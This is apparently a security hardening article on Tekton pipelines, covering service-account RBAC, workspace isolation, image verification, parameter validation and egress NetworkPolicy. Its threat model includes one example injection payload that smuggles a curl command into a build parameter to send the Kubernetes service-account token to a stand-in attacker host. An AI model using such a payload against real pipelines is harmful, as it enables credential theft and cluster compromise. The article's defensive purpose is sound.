---
title: "Tekton Pipeline Security: TaskRun Isolation, Workspace Permissions, and RBAC"
description: "Tekton runs CI/CD pipelines as Kubernetes pods. Each TaskRun executes in its own pod, but shared workspaces, overpermissive RBAC, and unrestricted step images allow a malicious pipeline step to access other steps' data, reach the Kubernetes API, or persist state across runs."
slug: "tekton-pipeline-security"
date: 2026-05-01
lastmod: 2026-05-01
category: "cicd"
tags: ["tekton", "kubernetes", "pipeline-security", "rbac", "workspace", "cicd"]
personas: ["platform-engineer", "security-engineer"]
article_number: 306
difficulty: "intermediate"
estimated_reading_time: 13
published: true
layout: article.njk
permalink: "/articles/cicd/tekton-pipeline-security/index.html"
---

# Tekton Pipeline Security: TaskRun Isolation, Workspace Permissions, and RBAC

## Problem

Tekton is a Kubernetes-native CI/CD framework: pipelines are defined as Kubernetes CRDs (Pipeline, Task, PipelineRun, TaskRun), and each Task runs as a pod with one container per step. This tight Kubernetes integration is both its strength and its attack surface.

Common security weaknesses:

- **Overpermissive RBAC for pipeline service accounts.** Tekton tasks need Kubernetes API access to create/manage resources, read secrets, and push container images. Many deployments bind the pipeline service account to `cluster-admin` for convenience, giving any pipeline job full cluster control.
- **Shared workspace volumes accessible across tasks.** Tekton workspaces pass data between tasks using PersistentVolumeClaims or ConfigMaps. Without access controls on the workspace, any step can read files written by any other step — including secrets written to the workspace by credential-injection steps.
- **Step images pulled from unverified sources.** Tekton Task definitions specify container images for each step. A task definition that references `latest` from an external registry, or from a registry without image signature verification, allows a supply chain compromise to execute arbitrary code in the pipeline.
- **Unrestricted network egress from TaskRun pods.** Pipeline steps make outbound HTTP calls (to package registries, APIs, build dependencies). Without egress controls, a compromised step can exfiltrate secrets to arbitrary external hosts.
- **Pipeline parameters injected as environment variables.** Tekton passes pipeline parameters to tasks via environment variables. Unvalidated parameters that include shell metacharacters can enable injection attacks in steps that use them in shell scripts.
- **No isolation between concurrent PipelineRuns.** Multiple PipelineRuns for the same Pipeline share no implicit isolation. If workspaces are backed by ReadWriteMany PVCs, concurrent runs may read each other's data.

**Target systems:** Tekton Pipelines 0.57+ (v1 API); Tekton Chains for supply chain security; Tekton Dashboard; Kubernetes 1.28+.

## Threat Model

- **Adversary 1 — RBAC escalation via pipeline service account:** A developer creates a Task that calls `kubectl get secrets --all-namespaces`. The task's service account has `cluster-admin`. The developer (or an attacker with developer role) reads all cluster secrets via pipeline output.
- **Adversary 2 — Workspace data leakage between tasks:** A credential-injection task writes an AWS key to a workspace file. A subsequent user-controlled task reads the workspace and sends the key to an attacker-controlled endpoint.
- **Adversary 3 — Malicious step image via supply chain compromise:** A Tekton Task references `registry.example.com/build-tools:latest`. The registry is compromised; a new `latest` image contains a backdoor. The next PipelineRun executes the backdoor with the pipeline's service account permissions.
- **Adversary 4 — Parameter injection:** A pipeline parameter `$BUILD_ARGS` is used in a shell script without sanitisation: `docker build $BUILD_ARGS .`. An attacker passes `--build-arg FOO=bar; curl attacker.com -d $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)` as the parameter.
- **Adversary 5 — Cross-run workspace contamination:** Two concurrent PipelineRuns share a ReadWriteMany workspace. Run A writes a malicious binary to the workspace. Run B executes it in a subsequent step.
- **Access level:** Adversaries 1 and 4 need Task submission access (developer role). Adversary 2 requires a task running after the credential task. Adversary 3 needs registry access. Adversary 5 needs concurrent PipelineRun access.
- **Objective:** Extract Kubernetes secrets, cloud credentials, and source code; establish persistence; compromise the build artefacts.
- **Blast radius:** A pipeline service account with cluster-admin provides the same access as a cluster compromise. Workspace leakage exposes every secret passed through the pipeline.

## Configuration

### Step 1: Least-Privilege Service Accounts

Create one service account per pipeline with minimal required permissions:

```yaml
# Each pipeline gets a dedicated service account.
apiVersion: v1
kind: ServiceAccount
metadata:
  name: build-pipeline-sa
  namespace: tekton-pipelines

---
# Role with minimum permissions for a build pipeline.
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: build-pipeline-role
  namespace: tekton-pipelines
rules:
  # Read the source code secret (deploy key for Git).
  - apiGroups: [""]
    resources: ["secrets"]
    resourceNames: ["git-deploy-key"]  # Only this specific secret.
    verbs: ["get"]

  # Push to the container registry (via imagePushSecret).
  - apiGroups: [""]
    resources: ["secrets"]
    resourceNames: ["registry-push-creds"]
    verbs: ["get"]

  # NOT: list/get all secrets; NOT: create/delete any resource.
  # NOT: access to other namespaces.

---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: build-pipeline-rolebinding
  namespace: tekton-pipelines
subjects:
  - kind: ServiceAccount
    name: build-pipeline-sa
    namespace: tekton-pipelines
roleRef:
  kind: Role
  name: build-pipeline-role
  apiGroup: rbac.authorization.k8s.io
```

```yaml
# Reference service account in PipelineRun.
apiVersion: tekton.dev/v1
kind: PipelineRun
metadata:
  name: my-app-build
  namespace: tekton-pipelines
spec:
  pipelineRef:
    name: build-and-push
  taskRunTemplate:
    serviceAccountName: build-pipeline-sa   # Use least-privilege SA.
```

### Step 2: Step Security Context

```yaml
# Task with security context hardening.
apiVersion: tekton.dev/v1
kind: Task
metadata:
  name: build-task
  namespace: tekton-pipelines
spec:
  steps:
    - name: build
      image: gcr.io/distroless/build@sha256:abc123...   # Pin by digest.
      securityContext:
        runAsNonRoot: true
        runAsUser: 65534
        readOnlyRootFilesystem: true
        allowPrivilegeEscalation: false
        capabilities:
          drop: ["ALL"]
      resources:
        requests:
          cpu: "500m"
          memory: "512Mi"
        limits:
          cpu: "2"
          memory: "2Gi"
      # Mount secrets explicitly; do not rely on service account token mounts.
      volumeMounts:
        - name: build-workspace
          mountPath: /workspace/source
        - name: tmp
          mountPath: /tmp    # Writable tmp since rootFilesystem is readonly.
  volumes:
    - name: tmp
      emptyDir: {}
```

### Step 3: Workspace Isolation

```yaml
# Use separate workspaces per security domain.
# Do NOT share a workspace between credential-injection steps and user code.

apiVersion: tekton.dev/v1
kind: Pipeline
metadata:
  name: secure-build-pipeline
spec:
  workspaces:
    - name: source-code       # Source code: read by user tasks.
    - name: credentials       # Credentials: written by trusted steps; NOT shared with user steps.
    - name: build-output      # Build artefacts: written by build; read by push step.

  tasks:
    # Step 1: Clone source code (trusted; writes to source-code workspace).
    - name: clone
      taskRef:
        name: git-clone
      workspaces:
        - name: output
          workspace: source-code

    # Step 2: Build (user-controlled code; access to source-code only, NOT credentials).
    - name: build
      taskRef:
        name: user-build-task
      workspaces:
        - name: source
          workspace: source-code
        - name: output
          workspace: build-output
      # Explicitly NOT giving access to: credentials workspace.
      runAfter: ["clone"]

    # Step 3: Push image (trusted; reads credentials; does NOT expose to user code).
    - name: push
      taskRef:
        name: image-push
      workspaces:
        - name: image
          workspace: build-output
        - name: creds
          workspace: credentials
      runAfter: ["build"]
```

```yaml
# Use per-PipelineRun workspaces backed by ephemeral volumes.
# Prevents cross-run contamination.
apiVersion: tekton.dev/v1
kind: PipelineRun
metadata:
  name: my-app-build-$(date +%s)
spec:
  pipelineRef:
    name: secure-build-pipeline
  workspaces:
    - name: source-code
      volumeClaimTemplate:
        spec:
          accessModes: ["ReadWriteOnce"]    # NOT ReadWriteMany — no sharing.
          resources:
            requests:
              storage: 1Gi
    - name: build-output
      volumeClaimTemplate:
        spec:
          accessModes: ["ReadWriteOnce"]
          resources:
            requests:
              storage: 5Gi
    # Credentials from existing PVC (or emptyDir for ephemeral creds).
    - name: credentials
      emptyDir: {}
```

### Step 4: Image Verification with Tekton Chains

Tekton Chains automatically signs TaskRun results with Sigstore/Cosign:

```yaml
# ConfigMap for Tekton Chains configuration.
apiVersion: v1
kind: ConfigMap
metadata:
  name: chains-config
  namespace: tekton-chains
data:
  # Sign task results with Sigstore keyless signing.
  artifacts.taskrun.format: "slsa/v1"
  artifacts.taskrun.storage: "oci"
  artifacts.taskrun.signing-backend: "sigstore"

  # Sign OCI image attestations.
  artifacts.oci.format: "simplesigning"
  artifacts.oci.storage: "oci"
  artifacts.oci.signing-backend: "sigstore"
```

```yaml
# Task: verify image before use.
apiVersion: tekton.dev/v1
kind: Task
metadata:
  name: verify-image
spec:
  params:
    - name: image
      type: string
  steps:
    - name: verify
      image: gcr.io/projectsigstore/cosign:v2.2.3@sha256:abc123
      script: |
        cosign verify \
          --certificate-identity-regexp="https://github.com/my-org/.*" \
          --certificate-oidc-issuer="https://token.actions.githubusercontent.com" \
          $(params.image)
        if [ $? -ne 0 ]; then
          echo "Image signature verification FAILED"
          exit 1
        fi
```

### Step 5: Parameter Validation

```yaml
# Task: validate parameters before use in shell scripts.
apiVersion: tekton.dev/v1
kind: Task
metadata:
  name: validated-build
spec:
  params:
    - name: git-revision
      type: string
      description: "Git commit SHA to build"
    - name: image-tag
      type: string
      description: "Docker image tag"
  steps:
    - name: validate-params
      image: alpine:3.19@sha256:abc123
      script: |
        #!/bin/sh
        set -euo pipefail

        GIT_REVISION="$(params.git-revision)"
        IMAGE_TAG="$(params.image-tag)"

        # Validate git revision: must be a 40-character hex string.
        if ! echo "$GIT_REVISION" | grep -qE '^[a-f0-9]{40}$'; then
          echo "INVALID: git-revision must be a 40-char hex SHA: $GIT_REVISION"
          exit 1
        fi

        # Validate image tag: only alphanumeric, dash, dot, underscore.
        if ! echo "$IMAGE_TAG" | grep -qE '^[a-zA-Z0-9._-]+$'; then
          echo "INVALID: image-tag contains illegal characters: $IMAGE_TAG"
          exit 1
        fi

        echo "Parameters validated."

    - name: build
      image: golang:1.22-alpine@sha256:abc123
      script: |
        #!/bin/sh
        set -euo pipefail
        # Safe to use validated params.
        GIT_REVISION="$(params.git-revision)"
        # Use quoted variables; not constructed into shell commands.
        go build -ldflags "-X main.Version=${GIT_REVISION}" ./...
```

### Step 6: Network Egress Control for TaskRun Pods

```yaml
# NetworkPolicy restricting TaskRun pod egress.
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: taskrun-egress-policy
  namespace: tekton-pipelines
spec:
  podSelector:
    matchLabels:
      app.kubernetes.io/managed-by: tekton-pipelines
  policyTypes:
    - Egress
  egress:
    # Allow to internal container registry.
    - to:
        - ipBlock:
            cidr: 10.0.50.0/24   # Registry subnet.
      ports:
        - port: 443
    # Allow to internal package proxy (Nexus/Artifactory).
    - to:
        - ipBlock:
            cidr: 10.0.51.0/24
      ports:
        - port: 443
        - port: 80
    # Allow DNS.
    - to:
        - namespaceSelector:
            matchLabels:
              kubernetes.io/metadata.name: kube-system
      ports:
        - port: 53
          protocol: UDP
    # Block all other egress — prevents secret exfiltration.
```

### Step 7: Audit Logging for Pipeline Activity

```yaml
# Tekton emits Kubernetes events and CloudEvents for pipeline activity.
# Forward to SIEM via event sink.

# CloudEvents sink (send to SIEM or security monitoring).
apiVersion: v1
kind: ConfigMap
metadata:
  name: config-observability
  namespace: tekton-pipelines
data:
  _example: |
    ################################
    # Tekton CloudEvents configuration
    ################################
    send-cloudevents-for-runs: "true"

# Alert on PipelineRun failures and unusual task durations.
```

```bash
# Query Tekton pipeline history for security investigation.
kubectl get pipelineruns -n tekton-pipelines \
  -o jsonpath='{range .items[*]}{.metadata.name} {.status.completionTime} {.status.conditions[0].reason}{"\n"}{end}' | \
  sort -k2

# Check which service accounts were used in recent runs.
kubectl get taskruns -n tekton-pipelines \
  -o jsonpath='{range .items[*]}{.metadata.name}: {.spec.serviceAccountName}{"\n"}{end}'
```

### Step 8: Telemetry

```
tekton_pipelinerun_duration_seconds{pipeline, status}          histogram
tekton_taskrun_duration_seconds{task, status}                  histogram
tekton_pipelinerun_count{pipeline, status}                     counter
tekton_taskrun_image_pull_errors_total{task, image}            counter
tekton_workspace_access_violations_total{task, workspace}      counter
tekton_param_validation_failures_total{task, param}            counter
```

Alert on:

- `tekton_taskrun_duration_seconds` P99 spike — a task is taking much longer than usual; possible exfiltration or heavy computation.
- Image pull from unverified registry — Tekton Chains verification failed; do not deploy the artefact.
- PipelineRun for a production deployment outside approved hours — possible unauthorised deployment.
- `tekton_param_validation_failures_total` — injection attempts in pipeline parameters.
- Service account with elevated permissions used in a PipelineRun by unexpected pipeline — RBAC anomaly.

## Expected Behaviour

| Signal | Default Tekton | Hardened Tekton |
|--------|---------------|-----------------|
| Task reads all cluster secrets | Service account has cluster-admin; reads all | Least-privilege SA; only specific named secrets |
| User task reads credential workspace | All workspaces shared; credentials readable | Credential workspace not mounted to user tasks |
| Malicious step image via supply chain | :latest pulled without verification | Digest pinned; Chains verifies signature before use |
| Shell injection via parameter | Unvalidated param used in shell command | Validation step rejects non-conforming params |
| Cross-run workspace contamination | ReadWriteMany PVC shared between runs | VolumeClaimTemplate creates fresh PVC per run |

## Trade-offs

| Aspect | Benefit | Cost | Mitigation |
|--------|---------|------|------------|
| Per-pipeline service accounts | Blast radius isolation | More service accounts to manage | Automate via Helm chart or Kustomize per team |
| VolumeClaimTemplate workspaces | Fresh PVC per run; no contamination | Higher storage cost; PVC provisioning latency | Use fast storage class; set PVC TTL via cleanup task |
| Digest-pinned images | Supply chain integrity | Must update digests on new releases | Renovate/Dependabot automates digest PR updates |
| Parameter validation step | Prevents injection | Adds a step to every pipeline | Shared Task definition; one validation task reused |

## Failure Modes

| Failure | Symptom | Detection | Recovery |
|---------|---------|-----------|----------|
| Service account missing permission | TaskRun fails with 403 | TaskRun status shows permission error | Add specific permission to SA role; review principle of least privilege |
| VolumeClaimTemplate PVC not provisioned | TaskRun stuck in pending | PVC pending status; storage provisioner error | Check StorageClass; ensure provisioner is running |
| Image signature verification failure | TaskRun fails at verify step | Chains logs; step failure | Investigate registry; rebuild with verified CI pipeline |
| Network policy blocks package registry | Build fails on package install | Connection refused in build logs | Add package registry IP to egress allowlist |
| Parameter validation too strict | Legitimate build fails validation | Validation step failure | Loosen validation regex; use allowlist over blocklist |

## Related Articles

- [Argo CD Security Hardening](/articles/cicd/argocd-security-hardening/)
- [Securing GitHub Actions](/articles/cicd/securing-github-actions/)
- [GitLab CI Security](/articles/cicd/gitlab-ci-security/)
- [Sigstore Keyless Signing](/articles/cicd/sigstore-keyless-signing/)
- [Kubernetes RBAC Design Patterns](/articles/kubernetes/rbac-design-patterns/)
